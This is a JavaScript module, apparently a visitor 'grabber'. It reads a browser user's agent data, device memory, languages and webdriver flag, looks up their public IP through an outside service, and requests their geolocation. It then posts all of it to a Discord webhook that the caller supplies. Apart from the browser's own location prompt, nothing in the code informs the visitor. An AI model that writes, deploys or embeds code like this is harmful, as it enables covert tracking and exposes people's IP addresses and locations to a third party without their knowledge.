const fetchUserInfo = async (options = {}) => {
  const result = {};
  if (window.navigator) {
    if (options.includeUserAgent !== false) {
      result.userAgent = navigator.userAgentData;
    }
    if (options.includeDeviceMemory !== false) {
      result.deviceMemory = navigator.deviceMemory;
    }
    if (options.includeLanguages !== false) {
      result.languages = navigator.languages;
    }
    if (options.includeWebdriver !== false) {
      result.webdriver = navigator.webdriver;
    }
    if (options.includeWebsite !== false) {
      result.website = options.website || 'example.com';
    }

    try {
      const response = await fetch('https://api.ipify.org/?format=json');
      const data = await response.json();
      if (options.includeIP !== false) {
        result.ip = data.ip;
      }
      if (options.includeLocation !== false) {
        const locationData = await fetchLocationData();
        result.location = locationData;
      }
      return result;
    } catch (error) {
      console.log(error);
    }
  }
  return result;
};

const fetchLocationData = async () => {
  try {
    const position = await getCurrentPosition();
    const { latitude, longitude } = position.coords;
    return { lat: latitude, lng: longitude };
  } catch (error) {
    console.log(error);
    return { lat: 0, lng: 0 };
  }
};

const getCurrentPosition = () => {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(resolve, reject);
  });
};

const createMessage = (userInfo, options = {}) => {
  let message = '';

  if (options.includeUserAgent !== false) {
    message += `- **User Agent:** ${JSON.stringify(userInfo.userAgent)}\n`;
  }
  if (options.includeDeviceMemory !== false) {
    message += `- **Device Memory:** ${userInfo.deviceMemory}\n`;
  }
  if (options.includeLanguages !== false) {
    message += `- **Languages:** ${userInfo.languages}\n`;
  }
  if (options.includeLocation !== false) {
    message += `- **Location:** ${JSON.stringify(userInfo.location)}\n`;
  }
  if (options.includeWebdriver !== false) {
    message += `- **Webdriver:** ${userInfo.webdriver}\n`;
  }
  if (options.includeIP !== false) {
    message += `- **IP Address:** ${userInfo.ip}\n`;
  }
  if (options.includeWebsite !== false) {
    message += `- **Website** ${options.website || 'example.com'}`;
  }

  return `User info:\n ${message}`;
};

const sendDiscordWebhook = async (webhookURL, options = {}) => {
  try {
    const userInfo = await fetchUserInfo(options);

    if (Object.keys(userInfo).length === 0) {
      console.warn('User info is empty, skipping webhook send.');
      return;
    }

    const message = createMessage(userInfo, options);

    const response = await fetch(webhookURL, {
      method: 'POST',
      body: JSON.stringify({
        content: message,
      }),
      headers: {
        'Content-Type': 'application/json',
      },
    });

    if (response.ok) {
      console.log('Webhook successfully sent!');
    } else {
      console.error('Webhook send failed:', response);
    }
  } catch (error) {
    console.error('Webhook send failed:', error);
  }
};

export default sendDiscordWebhook;
